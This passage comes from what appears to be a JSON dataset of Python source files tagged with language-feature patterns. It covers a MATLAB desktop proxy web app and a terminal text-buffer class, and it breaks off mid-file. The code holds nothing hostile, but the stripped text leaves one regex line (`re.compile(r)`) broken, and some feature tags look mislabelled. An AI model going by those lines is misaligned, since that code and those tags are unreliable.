logger.debug(f\"Cancelling MWI task: {task_name} : {task} \")\n            task.cancel()\n            try:\n                await task\n            except asyncio.CancelledError:\n                pass\n    await state.stop_matlab()\ndef create_app():\n    app = web.Application()\n    app[\"settings\"] = settings.get(dev=(mwi_env.is_development_mode_enabled()))\n    app[\"state\"] = AppState(app[\"settings\"])\n    if mwi_env.is_development_mode_enabled():\n        from matlab_desktop_proxy.default_config import default_config\n        app[\"state\"].env_config = default_config\n    if not mwi_env.is_development_mode_enabled():\n        app[\"static_route_table\"] = make_static_route_table(app)\n        for key in app[\"static_route_table\"].keys():\n            app.router.add_route(\"GET\", key, static_get)\n    base_url = app[\"settings\"][\"base_url\"]\n    app.router.add_route(\"GET\", f\"{base_url}/get_status\", get_status)\n    app.router.add_route(\"GET\", f\"{base_url}/get_env_config\", get_env_config)\n    app.router.add_route(\"PUT\", f\"{base_url}/start_matlab\", start_matlab)\n    app.router.add_route(\"DELETE\", f\"{base_url}/stop_matlab\", stop_matlab)\n    app.router.add_route(\"PUT\", f\"{base_url}/set_licensing_info\", set_licensing_info)\n    app.router.add_route(\n        \"DELETE\", f\"{base_url}/set_licensing_info\", licensing_info_delete\n    )\n    app.router.add_route(\n        \"DELETE\", f\"{base_url}/terminate_integration\", termination_integration_delete\n    )\n    app.router.add_route(\"*\", f\"{base_url}/\", root_redirect)\n    app.router.add_route(\"*\", f\"{base_url}/{{proxyPath:.*}}\", matlab_view)\n    app.on_startup.append(start_background_tasks)\n    app.on_cleanup.append(cleanup_background_tasks)\n    return app\ndef main():\n    logger = mwi_logger.get(init=True)\n    web_logger = None if not mwi_env.is_web_logging_enabled() else logger\n    config = util.parse_cli_args()[\"config\"]\n    app = create_app()\n    app[\"state\"].env_config = mwi_validators.validate_env_configs(config)\n    loop = asyncio.get_event_loop()\n    runner = web.AppRunner(app, logger=web_logger, access_log=web_logger)\n    loop.run_until_complete(runner.setup())\n    site = util.prepare_site(app, runner)\n    app[\"settings\"][\"app_port\"] = site._port\n    loop.run_until_complete(site.start())\n    loop = util.add_signal_handlers(loop)\n    logger.info(\"Starting MATLAB desktop proxy app\")\n    logger.info(\n        f' with base_url: {app[\"settings\"][\"base_url\"]} and app_port:{app[\"settings\"][\"app_port\"]}.'\n    )\n    prefix = (\n        \"MATLAB Desktop Proxy \"\n        if os.environ.get(mwi_env.get_env_name_mhlm_context()) is None\n        else f'MATLAB Integration for {default_config[\"targetEnv\"]}'\n    )\n    logger.info(\n        f'\\nThe {prefix} can be accessed on http://localhost:{app[\"settings\"][\"app_port\"]}{app[\"settings\"][\"base_url\"]}/index.html'\n    )\n    loop.run_forever()\n    async def shutdown():\n        logger.info(\"Shutting down MATLAB proxy-app\")\n        for task in asyncio.Task.all_tasks():\n            logger.debug(f\"calling cancel on all_tasks: {task}\")\n            task.cancel()\n        await app.shutdown()\n        await app.cleanup()\n        asyncio.ensure_future(exit())\n    try:\n        loop.run_until_complete(shutdown())\n    except:\n        pass\n    logger.info(\"Finished shutting down. Thank you for using the MATLAB desktop proxy.\")\n    loop.close()\n    sys.exit(0)",
            "patterns": {
                "pep_567": [
                    [
                        4,
                        4,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        167,
                        181,
                        "async for",
                        "async for msg in ws_from:\n                        mt = msg.type\n                        md = msg.data\n                        if mt == aiohttp.WSMsgType.TEXT:\n                            await ws_to.send_str(md)\n                        elif mt == aiohttp.WSMsgType.BINARY:\n                            await ws_to.send_bytes(md)\n                        elif mt == aiohttp.WSMsgType.PING:\n                            await ws_to.ping()\n                        elif mt == aiohttp.WSMsgType.PONG:\n                            await ws_to.pong()\n                        elif ws_to.closed:\n                            await ws_to.close(code=ws_to.close_code, message=msg.extra)\n                        else:\n                            raise ValueError(f\"Unexpected message type: {msg}\")"
                    ]
                ],
                "pep_498": [
                    [
                        152,
                        "    matlab_base_url = f\"{matlab_protocol}://localhost:{matlab_port}\""
                    ],
                    [
                        264,
                        "    app.router.add_route(\"GET\", f\"{base_url}/get_status\", get_status)"
                    ],
                    [
                        265,
                        "    app.router.add_route(\"GET\", f\"{base_url}/get_env_config\", get_env_config)"
                    ],
                    [
                        266,
                        "    app.router.add_route(\"PUT\", f\"{base_url}/start_matlab\", start_matlab)"
                    ],
                    [
                        267,
                        "    app.router.add_route(\"DELETE\", f\"{base_url}/stop_matlab\", stop_matlab)"
                    ],
                    [
                        268,
                        "    app.router.add_route(\"PUT\", f\"{base_url}/set_licensing_info\", set_licensing_info)"
                    ],
                    [
                        270,
                        "        \"DELETE\", f\"{base_url}/set_licensing_info\", licensing_info_delete"
                    ],
                    [
                        273,
                        "        \"DELETE\", f\"{base_url}/terminate_integration\", termination_integration_delete"
                    ],
                    [
                        275,
                        "    app.router.add_route(\"*\", f\"{base_url}/\", root_redirect)"
                    ],
                    [
                        276,
                        "    app.router.add_route(\"*\", f\"{base_url}/{{proxyPath:.*}}\", matlab_view)"
                    ],
                    [
                        295,
                        "        f' with base_url: {app[\"settings\"][\"base_url\"]} and app_port:{app[\"settings\"][\"app_port\"]}.'"
                    ],
                    [
                        300,
                        "        else f'MATLAB Integration for {default_config[\"targetEnv\"]}'"
                    ],
                    [
                        303,
                        "        f'\\nThe {prefix} can be accessed on http://localhost:{app[\"settings\"][\"app_port\"]}{app[\"settings\"][\"base_url\"]}/index.html'"
                    ],
                    [
                        245,
                        "            logger.debug(f\"Cancelling MWI task: {task_name} : {task} \")"
                    ],
                    [
                        309,
                        "            logger.debug(f\"calling cancel on all_tasks: {task}\")"
                    ],
                    [
                        140,
                        "                    table[f\"{base_url}{parent}/{name}\"] = {"
                    ],
                    [
                        197,
                        "                    f\"{matlab_base_url}{req.rel_url}\","
                    ],
                    [
                        181,
                        "                            raise ValueError(f\"Unexpected message type: {msg}\")"
                    ]
                ]
            }
        },
        "86": {
            "file": "import asyncio\nimport logging\nimport os\nimport re\nimport shlex\nimport shutil\nimport subprocess\nimport tempfile\nfrom collections import deque\nfrom enum import Enum\nfrom functools import wraps\nfrom typing import (\n    Any,\n    Awaitable,\n    Callable,\n    Deque,\n    Iterable,\n    List,\n    Optional,\n    Set,\n    Tuple,\n    TypeVar,\n    Union,\n    cast,\n)\nfrom quo.console.current import get_app\nfrom quo.console.run_in_terminal import run_in_terminal\nfrom quo.completion.auto_suggest import AutoSuggest, Suggestion\nfrom quo.cache.core import FastDictCache\nfrom quo.clipboard.core import Data\nfrom quo.completion.core import (\n    CompleteEvent,\n    Completer,\n    Completion,\n    DummyCompleter,\n    get_common_complete_suffix,\n)\nfrom quo.document import Document\nfrom quo.errors import ValidationError\nfrom quo.filters import FilterOrBool, to_filter\nfrom .history import History, InMemoryHistory\nfrom .search import SearchDirection, SearchState\nfrom .selection import PasteMode, SelectionState, SelectionType\nfrom quo.utils.utils import Event, to_str\nfrom quo.types import Validator\n__all__ = [\n    \"EditReadOnlyBuffer\",\n    \"Buffer\",\n    \"CompletionState\",\n    \"indent\",\n    \"unindent\",\n    \"reshape_text\",\n]\nlogger = logging.getLogger(__name__)\nclass EditReadOnlyBuffer(Exception):\n    \"Attempt editing of read-only :class:`.Buffer`.\"\nclass ValidationState(Enum):\n    \"The validation state of a buffer. This is set after the validation.\"\n    VALID = \"VALID\"\n    INVALID = \"INVALID\"\n    UNKNOWN = \"UNKNOWN\"\nclass CompletionState:\n    def __init__(\n        self,\n        original_document: \"Document\",\n        completions: Optional[List[\"Completion\"]] = None,\n        complete_index: Optional[int] = None,\n    ):\n        self.original_document = original_document\n        self.completions = completions or []\n        self.complete_index = complete_index  \n    def __repr__(self) -> str:\n        return \"%s(%r, <%r> completions, index=%r)\" % (\n            self.__class__.__name__,\n            self.original_document,\n            len(self.completions),\n            self.complete_index,\n        )\n    def go_to_index(self, index: Optional[int]) -> None:\n        if self.completions:\n            assert index is None or 0 <= index < len(self.completions)\n            self.complete_index = index\n    def new_text_and_position(self) -> Tuple[str, int]:\n        if self.complete_index is None:\n            return self.original_document.text, self.original_document.cursor_position\n        else:\n            original_text_before_cursor = self.original_document.text_before_cursor\n            original_text_after_cursor = self.original_document.text_after_cursor\n            c = self.completions[self.complete_index]\n            if c.start_position == 0:\n                before = original_text_before_cursor\n            else:\n                before = original_text_before_cursor[: c.start_position]\n            new_text = before + c.text + original_text_after_cursor\n            new_cursor_position = len(before) + len(c.text)\n            return new_text, new_cursor_position\n    @property\n    def current_completion(self) -> Optional[\"Completion\"]:\n        if self.complete_index is not None:\n            return self.completions[self.complete_index]\n        return None\n_QUOTED_WORDS_RE = re.compile(r)\nclass YankNthArgState:\n    def __init__(\n        self, history_position: int = 0, n: int = -1, previous_inserted_word: str = \"\"\n    ):\n        self.history_position = history_position\n        self.previous_inserted_word = previous_inserted_word\n        self.n = n\n    def __repr__(self) -> str:\n        return \"%s(history_position=%r, n=%r, previous_inserted_word=%r)\" % (\n            self.__class__.__name__,\n            self.history_position,\n            self.n,\n            self.previous_inserted_word,\n        )\nBufferEventHandler = Callable[[\"Buffer\"], None]\nBufferAcceptHandler = Callable[[\"Buffer\"], bool]\nclass Buffer:\n    def __init__(\n        self,\n        completer: Optional[Completer] = None,\n        auto_suggest: Optional[AutoSuggest] = None,\n        history: Optional[History] = None,\n        type: Optional[Validator] = None,\n        tempfile_suffix: Union[str, Callable[[], str]] = \"\",\n        tempfile: Union[str, Callable[[], str]] = \"\",\n        name: str = \"\",\n        complete_while_typing: FilterOrBool = False,\n        validate_while_typing: FilterOrBool = False,\n        enable_history_search: FilterOrBool = False,\n        document: Optional[Document] = None,\n        accept_handler: Optional[BufferAcceptHandler] = None,\n        read_only: FilterOrBool = False,\n        multiline: FilterOrBool = True,\n        on_text_changed: Optional[BufferEventHandler] = None,\n        on_text_insert: Optional[BufferEventHandler] = None,\n        on_cursor_position_changed: Optional[BufferEventHandler] = None,\n        on_completions_changed: Optional[BufferEventHandler] = None,\n        on_suggestion_set: Optional[BufferEventHandler] = None,\n    ):\n        enable_history_search = to_filter(enable_history_search)\n        complete_while_typing = to_filter(complete_while_typing)\n        validate_while_typing = to_filter(validate_while_typing)\n        read_only = to_filter(read_only)\n        multiline = to_filter(multiline)\n        self.completer = completer or DummyCompleter()\n        self.auto_suggest = auto_suggest\n        self.type = type\n        self.tempfile_suffix = tempfile_suffix\n        self.tempfile = tempfile\n        self.name = name\n        self.accept_handler = accept_handler\n        self.complete_while_typing = complete_while_typing\n        self.validate_while_typing = validate_while_typing\n        self.enable_history_search = enable_history_search\n        self.read_only = read_only\n        self.multiline = multiline\n        self.text_width = 0\n        self.history = InMemoryHistory() if history is None else history\n        self.__cursor_position = 0\n        self.on_text_changed: Event[\"Buffer\"] = Event(self, on_text_changed)\n        self.on_text_insert: Event[\"Buffer\"] = Event(self, on_text_insert)\n        self.on_cursor_position_changed: Event[\"Buffer\"] = Event(\n            self, on_cursor_position_changed\n        )\n        self.on_completions_changed: Event[\"Buffer\"] = Event(\n            self, on_completions_changed\n        )\n        self.on_suggestion_set: Event[\"Buffer\"] = Event(self, on_suggestion_set)\n        self._document_cache: FastDictCache[\n            Tuple[str, int, Optional[SelectionState]], Document\n        ] = FastDictCache(Document, size=10)\n        self._async_suggester = self._create_auto_suggest_coroutine()\n        self._async_completer = self._create_completer_coroutine()\n        self._async_validator = self._create_auto_validate_coroutine()\n        self._load_history_task: Optional[asyncio.Future[None]] = None\n        self.reset(document=document)\n    def __repr__(self) -> str:\n        if len(self.text) < 15:\n            text = self.text\n        else:\n            text = self.text[:12] + \"...\"\n        return \"<Buffer(name=%r, text=%r) at %r>\" % (self.name, text, id(self))\n    def reset(\n        self, document: Optional[Document] = None, append_to_history: bool = False\n    ) -> None:\n        if append_to_history:\n            self.append_to_history()\n        document = document or Document()\n        self.__cursor_position = document.cursor_position\n        self.validation_error: Optional[ValidationError] = None\n        self.validation_state: Optional[ValidationState] = ValidationState.UNKNOWN\n        self.selection_state: Optional[SelectionState] = None\n        self.multiple_cursor_positions: List[int] = []\n        self.preferred_column: Optional[int] = None\n        self.complete_state: Optional[CompletionState] = None\n        self.yank_nth_arg_state: Optional[YankNthArgState] = None  \n        self.document_before_paste: Optional[Document] = None\n        self.suggestion: Optional[Suggestion] = None\n        self.history_search_text: Optional[str] = None\n        self._undo_stack: List[Tuple[str, int]] = []\n        self._redo_stack: List[Tuple[str, int]] = []\n        if self._load_history_task is not None:\n            self._load_history_task.cancel()\n        self._load_history_task = None\n        self._working_lines: Deque[str] = deque([document.text])\n        self.__working_index = 0\n    def load_history_if_not_yet_loaded(self) -> None:\n        if self._load_history_task is None:\n            async def load_history() -> None:\n                async for item in self.history.load():\n                    self._working_lines.appendleft(item)\n                    self.__working_index += 1\n            self._load_history_task = get_app().create_background_task(load_history())\n            def load_history_done(f: \"asyncio.Future[None]\") -> None:\n                try:\n                    f.result()\n                except asyncio.CancelledError:\n                    pass\n                except GeneratorExit:\n                    pass\n                except BaseException:\n                    logger.exception(\"Loading history failed\")\n            self._load_history_task.add_done_callback(load_history_done)\n    def _set_text(self, value: str) -> bool:\n        working_index = self.working_index\n        working_lines = self._working_lines\n        original_value = working_lines[working_index]\n        working_lines[working_index] = value\n        if len(value) != len(original_value):\n            return True\n        elif value != original_value:\n            return True\n        return False\n    def _set_cursor_position(self, value: int) -> bool:\n        original_position = self.__cursor_position\n        self.__cursor_position = max(0, value)\n        return self.__cursor_position != original_position\n    @property\n    def text(self) -> str:\n        return self._working_lines[self.working_index]\n    @text.setter\n    def text(self, value: str) -> None:\n        if self.cursor_position > len(value):\n            self.cursor_position = len(value)\n        if self.read_only():\n            raise EditReadOnlyBuffer()\n        changed = self._set_text(value)\n        if changed:\n            self._text_changed()\n            self.history_search_text = None\n    @property\n    def cursor_position(self) -> int:\n        return self.__cursor_position\n    @cursor_position.setter\n    def cursor_position(self, value: int) -> None:\n        assert isinstance(value, int)\n        if value > len(self.text):\n            value = len(self.text)\n        if value < 0:\n            value = 0\n        changed = self._set_cursor_position(value)\n        if changed:\n            self._cursor_position_changed()\n    @property\n    def working_index(self) -> int:\n        return self.__working_index\n    @working_index.setter\n    def working_index(self, value: int) -> None:\n        if self.__working_index != value:\n            self.__working_index = value\n            self.cursor_position = 0\n            self._text_changed()\n    def _text_changed(self) -> None:\n        self.validation_error = None\n        self.validation_state = ValidationState.UNKNOWN\n        self.complete_state = None\n        self.yank_nth_arg_state = None\n        self.document_before_paste = None\n        self.selection_state = None\n        self.suggestion = None\n        self.preferred_column = None\n        self.on_text_changed.fire()\n        if self.type and self.validate_while_typing():\n            get_app().create_background_task(self._async_validator())\n    def _cursor_position_changed(self) -> None:\n        self.complete_state = None\n        self.yank_nth_arg_state = None\n        self.document_before_paste = None\n        self.preferred_column = None\n        self.on_cursor_position_changed.fire()\n    @property\n    def document(self) -> Document:\n        return self._document_cache[\n            self.text, self.cursor_position, self.selection_state\n        ]\n    @document.setter\n    def document(self, value: Document) -> None:\n        self.set_document(value)\n    def set_document(self, value: Document, bypass_readonly: bool = False) -> None:\n        if not bypass_readonly and self.read_only():\n            raise EditReadOnlyBuffer()\n        text_changed = self._set_text(value.text)\n        cursor_position_changed = self._set_cursor_position(value.cursor_position)\n        if text_changed:\n            self._text_changed()\n            self.history_search_text = None\n        if cursor_position_changed:\n            self._cursor_position_changed()\n    @property\n    def is_returnable(self) -> bool:\n        return bool(self.accept_handler)\n    def save_to_undo_stack(self, clear_redo_stack: bool = True) -> None:\n        if self._undo_stack and self._undo_stack[-1][0] == self.text:\n            self._undo_stack[-1] = (self._undo_stack[-1][0], self.cursor_position)\n        else:\n            self._undo_stack.append((self.text, self.cursor_position))\n        if clear_redo_stack:\n            self._redo_stack = []\n    def transform_lines(\n        self,\n        line_index_iterator: Iterable[int],\n        transform_callback: Callable[[str], str],\n    ) -> str:\n        lines = self.text.split(\"\\n\")\n        for index in line_index_iterator:\n            try:\n                lines[index] = transform_callback(lines[index])\n            except IndexError:\n                pass\n        return \"\\n\".join(lines)\n    def transform_current_line(self, transform_callback: Callable[[str], str]) -> None:\n        document = self.document\n        a = document.cursor_position + document.get_start_of_line_position()\n        b = document.cursor_position + document.get_end_of_line_position()\n        self.text = (\n            document.text[:a]\n            + transform_callback(document.text[a:b])\n            + document.text[b:]\n        )\n    def transform_region(\n        self, from_: int, to: int, transform_callback: Callable[[str], str]\n    ) -> None:\n        assert from_ < to\n        self.text = \"\".join(\n            [\n                self.text[:from_]\n                + transform_callback(self.text[from_:to])\n                + self.text[to:]\n            ]\n        )\n    def cursor_left(self, count: int = 1) -> None:\n        self.cursor_position += self.document.get_cursor_left_position(count=count)\n    def cursor_right(self, count: int = 1) -> None:\n        self.cursor_position += self.document.get_cursor_right_position(count=count)\n    def cursor_up(self, count: int = 1) -> None:\n        original_column = self.preferred_column or self.document.cursor_position_col\n        self.cursor_position += self.document.get_cursor_up_position(\n            count=count, preferred_column=original_column\n        )\n        self.preferred_column = original_column\n    def cursor_down(self, count: int = 1) -> None:\n        original_column = self.preferred_column or self.document.cursor_position_col\n        self.cursor_position += self.document.get_cursor_down_position(\n            count=count, preferred_column=original_column\n        )\n        self.preferred_column = original_column\n    def auto_up(\n        self, count: int = 1, go_to_start_of_line_if_history_changes: bool = False\n    ) -> None:\n        if self.complete_state:\n            self.complete_previous(count=count)\n        elif self.document.cursor_position_row > 0:\n            self.cursor_up(count=count)\n        elif not self.selection_state:\n            self.history_backward(count=count)\n            if go_to_start_of_line_if_history_changes:\n                self.cursor_position += self.document.get_start_of_line_position()\n    def auto_down(\n        self, count: int = 1, go_to_start_of_line_if_history_changes: bool = False\n    ) -> None:\n        if self.complete_state:\n            self.complete_next(count=count)\n        elif self.document.cursor_position_row < self.document.line_count - 1:\n            self.cursor_down(count=count)\n        elif not self.selection_state:\n            self.history_forward(count=count)\n            if go_to_start_of_line_if_history_changes:\n                self.cursor_position += self.document.get_start_of_line_position()\n    def delete_before_cursor(self, count: int = 1) -> str:\n        assert count >= 0\n        deleted = \"\"\n        if self.cursor_position > 0:\n            deleted = self.text[self.cursor_position - count : self.cursor_position]\n            new_text = (\n                self.text[: self.cursor_position - count]\n                + self.text[self.cursor_position :]\n            )\n            new_cursor_position = self.cursor_position - len(deleted)\n            self.document = Document(new_text, new_cursor_position)\n        return deleted\n    def delete(self, count: int = 1) -> str:\n        if self.cursor_position < len(self.text):\n            deleted = self.document.text_after_cursor[:count]\n            self.text = (\n                self.text[: self.cursor_position]\n                + self.text[self.cursor_position + len(deleted) :]\n            )\n            return deleted\n        else:\n            return \"\"\n    def join_next_line(self, separator: str = \" \") -> None:\n        if not self.document.on_last_line:\n            self.cursor_position += self.document.get_end_of_line_position()\n            self.delete()\n            self.text = (\n                self.document.text_before_cursor\n                + separator\n                + self.document.text_after_cursor.lstrip(\" \")\n            )\n    def join_selected_lines(self, separator: str = \" \") -> None:\n        assert self.selection_state\n        from_, to = sorted(\n            [self.cursor_position, self.selection_state.original_cursor_position]\n        )\n        before = self.text[:from_]\n        lines = self.text[from_:to].splitlines()\n        after = self.text[to:]\n        lines = [l.lstrip(\" \") + separator for l in lines]\n        self.document = Document(\n            text=before + \"\".join(lines) + after,\n            cursor_position=len(before + \"\".join(lines[:-1])) - 1,\n        )\n    def swap_characters_before_cursor(self) -> None:\n        pos = self.cursor_position\n        if pos >= 2:\n            a = self.text[pos - 2]\n            b = self.text[pos - 1]\n            self.text = self.text[: pos - 2] + b + a + self.text[pos:]\n    def go_to_history(self, index: int) -> None:\n        if index < len(self._working_lines):\n            self.working_index = index\n            self.cursor_position = len(self.text)\n    def complete_next(self, count: int = 1, disable_wrap_around: bool = False) -> None:\n        index: Optional[int]\n        if self.complete_state:\n            completions_count = len(self.complete_state.completions)\n            if self.complete_state.complete_index is None:\n                index = 0\n            elif self.complete_state.complete_index == completions_count - 1:\n                index = None\n                if disable_wrap_around:\n                    return\n            else:\n                index = min(\n                    completions_count - 1, self.complete_state.complete_index + count\n                )\n            self.go_to_completion(index)\n    def complete_previous(\n        self, count: int = 1, disable_wrap_around: bool = False\n    ) -> None:\n        index: Optional[int]\n        if self.complete_state:\n            if self.complete_state.complete_index == 0:\n                index = None\n                if disable_wrap_around:\n                    return\n            elif self.complete_state.complete_index is None:\n                index = len(self.complete_state.completions) - 1\n            else:\n                index = max(0, self.complete_state.complete_index - count)\n            self.go_to_completion(index)\n    def cancel_completion(self) -> None:\n        if self.complete_state:\n            self.go_to_completion(None)\n            self.complete_state = None\n    def _set_completions(self, completions: List[Completion]) -> CompletionState:\n        self.complete_state = CompletionState(\n            original_document=self.document, completions=completions\n        )\n        self.on_completions_changed.fire()\n        return self.complete_state\n    def start_history_lines_completion(self) -> None:\n        found_completions: Set[str] = set()\n        completions = []\n        current_line = self.document.current_line_before_cursor.lstrip()\n        for i, string in enumerate(self._working_lines):\n            for j, l in enumerate(string.split(\"\\n\")):\n                l = l.strip()\n                if l and l.startswith(current_line):\n                    if l not in found_completions:\n                        found_completions.add(l)\n                        if i == self.working_index:\n                            display_meta = \"Current, line %s\" % (j + 1)\n                        else:\n                            display_meta = \"History %s, line %s\" % (i + 1, j + 1)\n                        completions.append(\n                            Completion(\n                                l,\n                                start_position=-len(current_line),\n                                display_meta=display_meta,\n                            )\n                        )\n        self._set_completions(completions=completions[::-1])\n        self.go_to_completion(0)\n    def go_to_completion(self, index: Optional[int]) -> None:\n        assert self.complete_state\n        state = self.complete_state\n        state.go_to_index(index)\n        new_text, new_cursor_position = state.new_text_and_position()\n        self.document = Document(new_text, new_cursor_position)\n        self.complete_state = state\n    def apply_completion(self, completion: Completion) -> None:\n        if self.complete_state:\n            self.go_to_completion(None)\n        self.complete_state = None\n        self.delete_before_cursor(-completion.start_position)\n        self.insert_text(completion.text)\n    def _set_history_search(self) -> None:\n        if self.enable_history_search():\n            if self.history_search_text is None:\n                self.history_search_text = self.document.text_before_cursor\n        else:\n            self.history_search_text = None\n    def _history_matches(self, i: int) -> bool:\n        return self.history_search_text is None or self._working_lines[i].startswith(\n            self.history_search_text\n        )\n    def history_forward(self, count: int = 1) -> None:\n        self._set_history_search()\n        found_something = False\n        for i in range(self.working_index + 1, len(self._working_lines)):\n            if self._history_matches(i):\n                self.working_index = i\n                count -= 1\n                found_something = True\n            if count == 0:\n                break\n        if found_something:\n            self.cursor_position = 0\n            self.cursor_position += self.document.get_end_of_line_position()\n    def history_backward(self, count: int = 1) -> None:\n        self._set_history_search()\n        found_something = False\n        for i in range(self.working_index - 1, -1, -1):\n            if self._history_matches(i):\n                self.working_index = i\n                count -= 1\n                found_something = True\n            if count == 0:\n                break\n        if found_something:\n            self.cursor_position = len(self.text)\n    def yank_nth_arg(\n        self, n: Optional[int] = None, _yank_last_arg: bool = False\n    ) -> None:\n        assert n is None or isinstance(n, int)\n        history_strings = self.history.get_strings()\n        if not len(history_strings):\n            return\n        if self.yank_nth_arg_state is None:\n            state = YankNthArgState(n=-1 if _yank_last_arg else 1)\n        else:\n            state = self.yank_nth_arg_state\n        if n is not None:\n            state.n = n\n        new_pos = state.history_position - 1\n        if -new_pos > len(history_strings):\n            new_pos = -1\n        line = history_strings[new_pos]\n        words = [w.strip() for w in _QUOTED_WORDS_RE.split(line)]\n        words = [w for w in words if w]\n        try:\n            word = words[state.n]\n        except IndexError:\n            word = \"\"\n        if state.previous_inserted_word:\n            self.delete_before_cursor(len(state.previous_inserted_word))\n        self.insert_text(word)\n        state.previous_inserted_word = word\n        state.history_position = new_pos\n        self.yank_nth_arg_state = state\n    def yank_last_arg(self, n: Optional[int] = None) -> None:\n        self.yank_nth_arg(n=n, _yank_last_arg=True)\n    def start_selection(\n        self, selection_type: SelectionType = SelectionType.CHARACTERS\n    ) -> None:\n        self.selection_state = SelectionState(self.cursor_position, selection_type)\n    def copy_selection(self, _cut: bool = False) -> Data:\n        new_document, clipboard_data = self.document.cut_selection()\n        if _cut:\n            self.document = new_document\n        self.selection_state = None\n        return clipboard_data\n    def cut_selection(self) -> Data:\n        return self.copy_selection(_cut=True)\n    def paste_clipboard_data(\n        self,\n        data: Data,\n        paste_mode: PasteMode = PasteMode.EMACS,\n        count: int = 1,\n    ) -> None:\n        assert isinstance(data, Data)\n        assert paste_mode in (PasteMode.VI_BEFORE, PasteMode.VI_AFTER, PasteMode.EMACS)\n        original_document = self.document\n        self.document = self.document.paste_clipboard_data(\n            data, paste_mode=paste_mode, count=count\n        )\n        self.document_before_paste = original_document\n    def newline(self, copy_margin: bool = True) -> None:\n        if copy_margin:\n            self.insert_text(\"\\n\" + self.document.leading_whitespace_in_current_line)\n        else:\n            self.insert_text(\"\\n\")\n    def insert_line_above(self, copy_margin: bool = True) -> None:\n        if copy_margin:\n            insert = self.document.leading_whitespace_in_current_line + \"\\n\"\n        else:\n            insert = \"\\n\"\n        self.cursor_position += self.document.get_start_of_line_position()\n        self.insert_text(insert)\n        self.cursor_position -= 1\n    def insert_line_below(self, copy_margin: bool = True) -> None:\n        if copy_margin:\n            insert = \"\\n\" + self.document.leading_whitespace_in_current_line\n        else:\n            insert = \"\\n\"\n        self.cursor_position += self.document.get_end_of_line_position()\n        self.insert_text(insert)\n    def insert_text(\n        self,\n        data: str,\n        overwrite: bool = False,\n        move_cursor: bool = True,\n        fire_event: bool = True,\n    ) -> None:\n        otext = self.text\n        ocpos = self.cursor_position\n        if overwrite:\n            overwritten_text = otext[ocpos : ocpos + len(data)]\n            if \"\\n\" in overwritten_text:\n                overwritten_text = overwritten_text[: overwritten_text.find(\"\\n\")]\n            text = otext[:ocpos] + data + otext[ocpos + len(overwritten_text) :]\n        else:\n            text = otext[:ocpos] + data + otext[ocpos:]\n        if move_cursor:\n            cpos = self.cursor_position + len(data)\n        else:\n            cpos = self.cursor_position\n        self.document = Document(text, cpos)\n        if fire_event:  \n            self.on_text_insert.fire()\n            if self.completer and self.complete_while_typing():\n                get_app().create_background_task(self._async_completer())\n            if self.auto_suggest:\n                get_app().create_background_task(self._async_suggester())\n    def undo(self) -> None:\n        while self._undo_stack:\n            text, pos = self._undo_stack.pop()\n            if text != self.text:\n                self._redo_stack.append((self.text, self.cursor_position))\n                self.document = Document(text, cursor_position=pos)\n                break\n    def redo(self) -> None:\n        if self._redo_stack:\n            self.save_to_undo_stack(clear_redo_stack=False)\n            text, pos = self._redo_stack.pop()\n            self.document = Document(text, cursor_position=pos)\n    def validate(self, set_cursor: bool = False) -> bool:\n        if self.validation_state != ValidationState.UNKNOWN:\n            return self.validation_state == ValidationState.VALID\n        if self.type:\n            try:\n                self.type.validate(self.document)\n            except ValidationError as e:\n                if set_cursor:\n                    self.line = min(max(0, e.line), len(self.text))\n                self.validation_state = ValidationState.INVALID\n                self.validation_error = e\n                return False\n        self.validation_state = ValidationState.VALID\n        self.validation_error = None\n        return True\n    async def _validate_async(self) -> None:\n        while True:\n            if self.validation_state != ValidationState.UNKNOWN:\n                return\n            error = None\n            document = self.document\n            if self.type:\n                try:\n                    await self.type.validate_async(self.document)\n                except ValidationError as e:\n                    error = e\n                if self.document != document:\n                    continue\n            if error:\n                self.validation_state = ValidationState.INVALID\n            else:\n                self.validation_state = ValidationState.VALID\n            self.validation_error = error\n            get_app().invalidate()  \n    def append_to_history(self) -> None:\n        if self.text:\n            history_strings = self.history.get_strings()\n            if not len(history_strings) or history_strings[-1] != self.text:\n                self.history.append(self.text)\n    def _search(\n        self,\n        search_state: SearchState,\n        include_current_position: bool = False,\n        count: int = 1,\n    ) -> Optional[Tuple[int, int]]:\n        assert count > 0\n        text = search_state.text\n        direction = search_state.direction\n        ignore_case = search_state.ignore_case()\n        def search_once(\n            working_index: int, document: Document\n        ) -> Optional[Tuple[int, Document]]:\n            if direction == SearchDirection.FORWARD:\n                new_index = document.find(\n                    text,\n                    include_current_position=include_current_position,\n                    ignore_case=ignore_case,\n                )\n                if new_index is not None:\n                    return (\n                        working_index,\n                        Document(document.text, document.cursor_position + new_index),\n                    )\n                else:\n                    for i in range(working_index + 1, len(self._working_lines) + 1):\n                        i %= len(self._working_lines)\n                        document = Document(self._working_lines[i], 0)\n                        new_index = document.find(\n                            text, include_current_position=True, ignore_case=ignore_case\n                        )\n                        if new_index is not None:\n                            return (i, Document(document.text, new_index))\n            else:\n                new_index = document.find_backwards(text, ignore_case=ignore_case)\n                if new_index is not None:\n                    return (\n                        working_index,\n                        Document(document.text, document.cursor_position + new_index),\n                    )\n                else:\n                    for i in range(working_index - 1, -2, -1):\n                        i %= len(self._working_lines)\n                        document = Document(\n                            self._working_lines[i], len(self._working_lines[i])\n                        )\n                        new_index = document.find_backwards(\n                            text, ignore_case=ignore_case\n                        )\n                        if new_index is not None:\n                            return (\n                                i,\n                                Document(document.text, len(document.text) + new_index),\n                            )\n            return None\n        working_index = self.working_index\n        document = self.document\n        for _ in range(count):\n            result = search_once(working_index, document)\n            if result is None:\n                return None  \n            else:\n                working_index, document = result\n        return (working_index, document.cursor_position)\n    def document_for_search(self, search_state: SearchState) -> Document:\n        search_result = self._search(search_state, include_current_position=True)\n        if search_result is None:\n            return self.document\n        else:\n            working_index, cursor_position = search_result\n            if working_index == self.working_index:\n                selection = self.selection_state\n            else:\n                selection = None\n            return Document(\n                self._working_lines[working_index], cursor_position, selection=selection\n            )\n    def get_search_position(\n        self,\n        search_state: SearchState,\n        include_current_position: bool = True,\n        count: int = 1,\n    ) -> int:\n        search_result = self._search(\n            search_state, include_current_position=include_current_position, count=count\n        )\n        if search_result is None:\n            return self.cursor_position\n        else:\n            working_index, cursor_position = search_result\n            return cursor_position\n    def apply_search(\n        self,\n        search_state: SearchState,\n        include_current_position: bool = True,\n        count: int = 1,\n    ) -> None:\n        search_result = self._search(\n            search_state, include_current_position=include_current_position, count=count\n        )\n        if search_result is not None:\n            working_index, cursor_position = search_result\n            self.working_index = working_index\n            self.cursor_position = cursor_position\n    def 